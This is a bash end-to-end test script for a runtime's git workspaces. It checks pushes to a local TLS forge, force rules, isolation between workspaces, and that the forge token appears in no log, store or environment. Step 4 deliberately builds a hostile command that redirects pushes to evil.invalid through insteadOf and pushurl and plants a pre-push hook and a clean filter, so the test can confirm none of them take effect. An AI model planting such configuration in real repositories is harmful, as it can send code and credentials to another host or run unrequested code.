#!/usr/bin/env bash
# test/runtime/workspace-git/run.sh — git workspaces end to end (RFC GW P11
# PR 10): a booted runtime, a remote workspace worker attached over TLS
# (worker_endpoint.tls), deterministic code-js agents, no provider key, and a
# local forge: git's own http-backend behind TLS and Basic auth
# (forge/main.go), recording every request. Checks that:
#   - an agent opens the repository as a git workspace, commits and pushes
#     its own branch, which the forge then holds;
#   - a rewrite of the own branch is refused without force and leaves the
#     forge's log without a receive-pack; with force it goes through;
#   - a hostile repository configuration set by git in the session (an
#     insteadOf and a pushurl to another host, a pre-push hook, a clean
#     filter) changes nothing: the push goes to the row's URL, and no hook or
#     filter runs;
#   - two workspaces of one repository do not see each other's changes, and
#     a fetch brings a commit made on the forge;
#   - the agent-teams orchestrator's team/repo flow (open, commit, git_push
#     of its own branch) works against the forge (P14 D-P14-39);
#   - the token canary: the forge token is in no run stream, log, audit line,
#     store or worker directory, nor the worker's environment; every network
#     op wrote one workspace_git audit line.
# The core trusts the forge's certificate through SSL_CERT_FILE, which Go
# honours on Linux only: elsewhere the suite skips, unless CI is set.
# Needs git, openssl, python3 and curl.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
cd "$REPO_ROOT"

skip() {
  if [[ -n "${CI:-}" || "${LOOMCYCLE_REQUIRE_GIT_E2E:-}" == 1 ]]; then echo "FAIL ✗ — $1"; exit 1; fi
  echo "SKIP — $1"; exit 0
}
for tool in git openssl python3 curl; do
  command -v "$tool" >/dev/null 2>&1 || skip "$tool is not on PATH"
done
[[ "$(uname)" == Linux ]] || skip "the core trusts the test forge through SSL_CERT_FILE, which Go reads on Linux only"

TEST_DIR="$(cd "$(mktemp -d -t loomcycle-wsgit.XXXXXX)" && pwd -P)"
PORT=18971
WPORT=18972
FPORT=18973
PIDS=()
cleanup() {
  for p in "${PIDS[@]:-}"; do
    [[ -n "$p" ]] && { kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; }
  done
  [[ -n "${PID:-}" ]] && { kill "$PID" 2>/dev/null || true; wait "$PID" 2>/dev/null || true; }
  echo; echo "Test dir kept for inspection: $TEST_DIR"
}
trap cleanup EXIT INT TERM

TOKEN="test-token-$(date +%s)"
BASE="http://127.0.0.1:$PORT"
DATA="$TEST_DIR/data"
ROOT="$TEST_DIR/worker"
VOL="$TEST_DIR/vol"
mkdir -p "$VOL" "$ROOT"
# shellcheck source=test/runtime/workspace/lib.sh
source "$REPO_ROOT/test/runtime/workspace/lib.sh"

# The forge's token: random, so a match anywhere is a leak.
FORGE_TOKEN="forgecanary-$(python3 -I -c 'import secrets; print(secrets.token_hex(16))')"
FORGE="https://127.0.0.1:$FPORT"
REPO="$FORGE/acme/app.git"
G() { git -c user.name=forge -c user.email=forge@example.com "$@"; }

echo "[1/7] the forge: a repository behind TLS and Basic auth"
openssl req -x509 -newkey rsa:2048 -nodes -days 2 -subj /CN=loomcycle-git-e2e \
  -addext "subjectAltName=IP:127.0.0.1" -keyout "$TEST_DIR/tls.key" -out "$TEST_DIR/tls.crt" 2>/dev/null
SYSTEM_ROOTS=""
for f in /etc/ssl/certs/ca-certificates.crt /etc/pki/tls/certs/ca-bundle.crt; do
  [[ -f "$f" ]] && { SYSTEM_ROOTS="$f"; break; }
done
[[ -n "$SYSTEM_ROOTS" ]] || fail "no system CA bundle found"
cat "$SYSTEM_ROOTS" "$TEST_DIR/tls.crt" > "$TEST_DIR/roots.pem"
SERVED="$TEST_DIR/served"
WORK="$TEST_DIR/forge-work"
mkdir -p "$SERVED/acme" "$WORK"
G -C "$WORK" init -q -b main
echo "hello" > "$WORK/README.md"
G -C "$WORK" add README.md
G -C "$WORK" commit -q -m "first"
G clone -q --bare "$WORK" "$SERVED/acme/app.git"
G -C "$SERVED/acme/app.git" config http.receivepack true
go build -o "$TEST_DIR/forge" ./test/runtime/workspace-git/forge
"$TEST_DIR/forge" -addr "127.0.0.1:$FPORT" -root "$SERVED" -cert "$TEST_DIR/tls.crt" -key "$TEST_DIR/tls.key" \
  -token "$FORGE_TOKEN" -log "$TEST_DIR/forge.requests" > "$TEST_DIR/forge.out" 2>&1 &
PIDS+=($!)
wait_until 10 grep -q ready "$TEST_DIR/forge.out" || fail "the forge did not start: $(cat "$TEST_DIR/forge.out")"
forge_has() { G -C "$SERVED/acme/app.git" rev-parse --verify -q "$1" 2>/dev/null || true; }
receives() { grep -c '^POST .*/git-receive-pack ' "$TEST_DIR/forge.requests" || true; }

echo "[2/7] build + boot (workspace.mode remote, the worker link over TLS)"
CODE="$(sed 's/^/      /' "$SCRIPT_DIR/agent.js")"
cat > "$TEST_DIR/loomcycle.yaml" <<YAML
provider_priority: [mock]
tiers:
  middle:
    - { provider: mock, model: mock-generic }
conversion:
  mode: inprocess
worker_endpoint:
  listen: 127.0.0.1:$WPORT
  tls:
    cert_file: $TEST_DIR/tls.crt
    key_file: $TEST_DIR/tls.key
workspace:
  mode: remote
  push:
    ref_prefixes: [refs/heads/loom/]
agents:
  wsgit:
    provider: code-js
    description: "Git workspaces end to end: the Workspace calls the prompt lists."
    tools: [Workspace]
    workspace: { ops: [read, write, exec], open: true }
    git_remote: [fetch, push]
    code: |
$CODE
  team/orchestrator:
    tier: ""
    provider: code-js
    tools: [Agent, Document, TeamDef, Channel, Interruption, Context, Memory, VolumeDef, Workspace, File]
YAML
go build -o bin/loomcycle ./cmd/loomcycle
env -i PATH="$PATH" HOME="$TEST_DIR/home" \
LOOMCYCLE_PRESETS=agent-teams \
LOOMCYCLE_MOCK_ENABLED=1 \
LOOMCYCLE_CODE_AGENTS_ROOT="$REPO_ROOT/test/runtime/workspace-bundles/agent_code" \
LOOMCYCLE_DATA_DIR="$DATA" \
LOOMCYCLE_LISTEN_ADDR="127.0.0.1:$PORT" \
LOOMCYCLE_AUTH_TOKEN="$TOKEN" \
LOOMCYCLE_SECRET_KEY="$(python3 -I -c 'import base64,os; print(base64.b64encode(os.urandom(32)).decode())')" \
LOOMCYCLE_HTTP_PRIVATE_HOST_ALLOWLIST="127.0.0.1/32" \
LOOMCYCLE_GIT_SOURCE_HOSTS="127.0.0.1:$FPORT" \
LOOMCYCLE_GIT_PUSH_HOSTS="127.0.0.1:$FPORT" \
LOOMCYCLE_GIT_AUTHOR_NAME="Loom Test" \
LOOMCYCLE_GIT_AUTHOR_EMAIL="loom@example.com" \
LOOMCYCLE_AUDIT_LOG_PATH="$TEST_DIR/audit.jsonl" \
SSL_CERT_FILE="$TEST_DIR/roots.pem" \
  ./bin/loomcycle --config "$TEST_DIR/loomcycle.yaml" > "$TEST_DIR/boot.log" 2>&1 &
PID=$!
READY=0
for _ in $(seq 1 100); do
  curl -fsS "$BASE/healthz" >/dev/null 2>&1 && { READY=1; break; }
  kill -0 "$PID" 2>/dev/null || { echo "boot failed:"; cat "$TEST_DIR/boot.log"; exit 1; }
  sleep 0.2
done
[[ "$READY" == "1" ]] || { echo "not ready:"; cat "$TEST_DIR/boot.log"; exit 1; }

api() { curl -fsS -X POST -H "Authorization: Bearer $1" -H "Content-Type: application/json" -d "$3" "$BASE$2"; }
mint() { # tenant subject scopes-json
  api "$TOKEN" /v1/_operatortokendef "{\"op\":\"create\",\"name\":\"$2\",\"tenant_id\":\"$1\",\"subject\":\"$2\",\"scopes\":$3}" |
    python3 -I -c 'import sys,json; print(json.load(sys.stdin)["token"])'
}
RUN_TOKEN=$(mint acme dev '["substrate:tenant","runs:create","runs:read"]')
WORKER_TOKEN=$(mint acme w-git '["workers:attach"]')
env -i PATH="$PATH" HOME="$TEST_DIR/home" \
LOOMCYCLE_WORKER_TOKEN="$WORKER_TOKEN" \
LOOMCYCLE_WORKER_TLS_CA="$TEST_DIR/tls.crt" \
LOOMCYCLE_WORKSPACE_ROOT="$ROOT" \
LOOMCYCLE_WORKSPACE_ENGINE=host \
  ./bin/loomcycle worker --role workspace --id wgit --dispatcher "127.0.0.1:$WPORT" > "$TEST_DIR/worker.log" 2>&1 &
WORKER_PID=$!
PIDS+=($WORKER_PID)
attached() { grep -q "workspace worker attached.*worker_id=tenant:acme/wgit" "$TEST_DIR/boot.log"; }
wait_until 60 attached || { cat "$TEST_DIR/worker.log"; fail "the worker did not attach over TLS"; }

echo "[3/7] the tenant's forge credential, restricted to the repository's URL"
api "$RUN_TOKEN" /v1/_credentialdef "{\"op\":\"create\",\"name\":\"forge\",\"scope\":\"tenant\",\"value\":\"$FORGE_TOKEN\",\"allowed_urls\":[\"$FORGE/acme/\"]}" >/dev/null ||
  fail "creating the forge credential failed"

# steps runs wsgit with the Workspace calls of JSON list $2 and leaves its
# report (a JSON list of answers) in $1.json.
steps() {
  python3 -I -c 'import json,sys; print(json.dumps({"agent":"wsgit","user_id":"dev","segments":[{"role":"user","content":[{"type":"trusted-text","text":sys.argv[1]}]}]}))' "$2" > "$TEST_DIR/$1.req"
  curl -fsS -N -H "Authorization: Bearer $RUN_TOKEN" -H "Content-Type: application/json" -H "Accept: text/event-stream" \
    -d @"$TEST_DIR/$1.req" "$BASE/v1/runs" > "$TEST_DIR/$1.sse" || fail "$1: the run request failed"
  sse_text "$TEST_DIR/$1.sse" > "$TEST_DIR/$1.json"
  python3 -I -c 'import json,sys; json.load(open(sys.argv[1]))' "$TEST_DIR/$1.json" 2>/dev/null ||
    fail "$1: no report: $(tail -20 "$TEST_DIR/$1.sse")"
}
# answer prints field $3 of answer $2 (0-based) of report $1; "error" reads
# a refusal's class.
answer() { python3 -I -c 'import json,sys; v=json.load(open(sys.argv[1]))[int(sys.argv[2])]; print(v.get(sys.argv[3], ""))' "$TEST_DIR/$1.json" "$2" "$3"; }
want() { # report index field value
  local got; got=$(answer "$1" "$2" "$3")
  [[ "$got" == "$4" ]] || fail "$1 #$2: $3 = '$got', want '$4' (report: $(cat "$TEST_DIR/$1.json"))"
}
ok() { # report index
  [[ -z "$(answer "$1" "$2" error)" ]] || fail "$1 #$2 refused: $(cat "$TEST_DIR/$1.json")"
}

echo "[4/7] open, commit and push the own branch; a rewrite needs force; a hostile configuration changes nothing"
SESSION_ENV='GIT_AUTHOR_NAME=s GIT_AUTHOR_EMAIL=s@example.com GIT_COMMITTER_NAME=s GIT_COMMITTER_EMAIL=s@example.com'
MARKERS="$TEST_DIR/markers"
mkdir -p "$MARKERS"
steps push "$(python3 -I - "$REPO" "$SESSION_ENV" "$MARKERS" <<'PY'
import json, sys
repo, env, markers = sys.argv[1:4]
# The amend runs before the hook and the filter are set: a marker can only
# come from a typed op running one.
hostile = " && ".join([
  "export " + env,
  "git commit -q --amend -m rewritten",
  'git config url."https://evil.invalid/".insteadOf "https://127.0.0.1"',
  "git config remote.origin.pushurl https://evil.invalid/x.git",
  "mkdir -p .git/hooks",
  "printf '#!/bin/sh\\ntouch %s/hook\\n' > .git/hooks/pre-push" % markers,
  "chmod +x .git/hooks/pre-push",
  "git config core.hooksPath .git/hooks",
  "echo '*.txt filter=evil' > .gitattributes",
  "git config filter.evil.clean 'touch %s/filter; cat'" % markers,
])
print(json.dumps([
  {"op": "open", "name": "app", "repo": repo, "credential": "$cred:forge"},   # 0
  {"op": "write", "name": "app", "path": "work.txt", "content": "work\n"},    # 1
  {"op": "git_commit", "name": "app", "message": "add work", "paths": ["work.txt"]},  # 2
  {"op": "git_push", "name": "app"},                                          # 3
  {"op": "exec", "name": "app", "command": hostile},                          # 4
  {"op": "git_push", "name": "app"},                                          # 5: a rewrite, refused
  {"op": "write", "name": "app", "path": "more.txt", "content": "more\n"},    # 6
  {"op": "git_commit", "name": "app", "message": "more", "paths": ["more.txt"]},  # 7
  {"op": "git_push", "name": "app", "force": True},                           # 8
]))
PY
)"
for i in 0 1 2 3 6 7 8; do ok push "$i"; done
want push 4 exit_code 0
BRANCH=$(answer push 0 branch)
[[ "$BRANCH" == loom/app-* ]] || fail "the own branch is '$BRANCH'"
[[ -n "$(answer push 5 error)" ]] || fail "a rewrite was pushed without force"
# The first push and the forced one reached the forge's receive-pack; the
# refused rewrite sent nothing.
[[ "$(receives)" == 2 ]] || fail "receive-packs: $(receives), want 2: $(cat "$TEST_DIR/forge.requests")"
grep -q "^POST /acme/app.git/git-receive-pack 200$" "$TEST_DIR/forge.requests" || fail "the forge accepted no push"
[[ "$(forge_has "refs/heads/$BRANCH")" == "$(answer push 7 commit)" ]] || fail "the forced push did not move $BRANCH"
G -C "$SERVED/acme/app.git" log -1 --format='%an' "refs/heads/$BRANCH" | grep -qx "Loom Test" || fail "the commit's author is not the operator's"
[[ -e "$MARKERS/hook" ]] && fail "a pre-push hook ran"
[[ -e "$MARKERS/filter" ]] && fail "a clean filter ran"
grep -v "^\(GET\|POST\) /acme/app.git/" "$TEST_DIR/forge.requests" && fail "a request for another path reached the forge"

echo "[5/7] two workspaces do not see each other; a fetch brings the forge's commit"
echo "from the forge" > "$WORK/forge.txt"
G -C "$WORK" add forge.txt
G -C "$WORK" commit -q -m "on the forge"
G -C "$WORK" push -q "$SERVED/acme/app.git" main
TIP=$(G -C "$WORK" rev-parse HEAD)
steps iso "$(python3 -I - "$REPO" <<'PY'
import json, sys
repo = sys.argv[1]
print(json.dumps([
  {"op": "open", "name": "a", "repo": repo, "credential": "$cred:forge"},
  {"op": "open", "name": "b", "repo": repo, "credential": "$cred:forge"},
  {"op": "write", "name": "a", "path": "only-a.txt", "content": "a\n"},
  {"op": "read", "name": "b", "path": "only-a.txt"},
  {"op": "git_fetch", "name": "b"},
  {"op": "git_log", "name": "b", "rev": "origin/main", "max": 1},
]))
PY
)"
for i in 0 1 2 4 5; do ok iso "$i"; done
[[ -n "$(answer iso 3 error)" ]] || fail "workspace b read a's file"
python3 -I -c 'import json,sys; v=json.load(open(sys.argv[1]))[5]; assert v["commits"][0]["hash"]==sys.argv[2], v' "$TEST_DIR/iso.json" "$TIP" ||
  fail "b's origin/main is not the forge's new commit"

echo "[6/7] agent-teams team/orchestrator: the team/repo flow (closes P14 D-P14-39)"
python3 -I -c 'import json,sys; print(json.dumps({"agent":"team/orchestrator","user_id":"dev","segments":[{"role":"user","content":[{"type":"trusted-text","text":sys.argv[1]}]}]}))' "repo $REPO \$cred:forge" > "$TEST_DIR/team.req"
curl -fsS -N -H "Authorization: Bearer $RUN_TOKEN" -H "Content-Type: application/json" -H "Accept: text/event-stream" \
  -d @"$TEST_DIR/team.req" "$BASE/v1/runs" > "$TEST_DIR/team.sse" || fail "team/orchestrator: the run request failed"
R=$(sse_text "$TEST_DIR/team.sse")
echo "      $R"
TB=$(echo "$R" | sed -n 's/.*branch=\([^ ]*\).*/\1/p')
TC=$(echo "$R" | sed -n 's/.*commit=\([0-9a-f]\{40\}\).*/\1/p')
[[ "$TB" == loom/repo-* && -n "$TC" ]] || fail "team/orchestrator: $R"
echo "$R" | grep -q "pushed=refs/heads/$TB" || fail "team/orchestrator did not push its branch: $R"
[[ "$(forge_has "refs/heads/$TB")" == "$TC" ]] || fail "the forge's $TB is not the team's commit"

echo "[7/7] the token canary and the audit log"
for f in "$TEST_DIR"/*.sse "$TEST_DIR"/*.json "$TEST_DIR"/*.log "$TEST_DIR/audit.jsonl" "$TEST_DIR/forge.requests"; do
  [[ -f "$f" ]] && grep -qaF -- "$FORGE_TOKEN" "$f" && fail "the forge token is in $f"
done
grep -rqaF -- "$FORGE_TOKEN" "$DATA" "$ROOT" 2>/dev/null && fail "the forge token is on disk: $(grep -rlaF -- "$FORGE_TOKEN" "$DATA" "$ROOT")"
[[ -r "/proc/$WORKER_PID/environ" ]] && tr '\0' '\n' < "/proc/$WORKER_PID/environ" | grep -qF -- "$FORGE_TOKEN" && fail "the forge token is in the worker's environment"
python3 -I - "$TEST_DIR/audit.jsonl" <<'PY' || fail "the audit log: $(grep workspace_git "$TEST_DIR/audit.jsonl" || true)"
import json, sys
lines = [json.loads(l) for l in open(sys.argv[1]) if '"workspace_git"' in l]
ops = [l.get("workspace_op") for l in lines]
# push: open and three git_push (one refused); iso: open, open, git_fetch;
# team: open, git_push.
want = {"open": 4, "git_push": 4, "git_fetch": 1}
for op, n in want.items():
    assert ops.count(op) == n, f"{op}: {ops.count(op)} lines, want {n} ({ops})"
for l in lines:
    assert l.get("git_credential") == "$cred:forge", l
    assert l.get("git_host", "").startswith("127.0.0.1:"), l
outcomes = sorted(l.get("git_outcome") for l in lines if l.get("workspace_op") == "git_push")
assert outcomes.count("ok") == 3 and len(outcomes) == 4, outcomes
print("      audit: %d workspace_git lines" % len(lines))
PY
echo "=== workspace git suite PASSED ==="
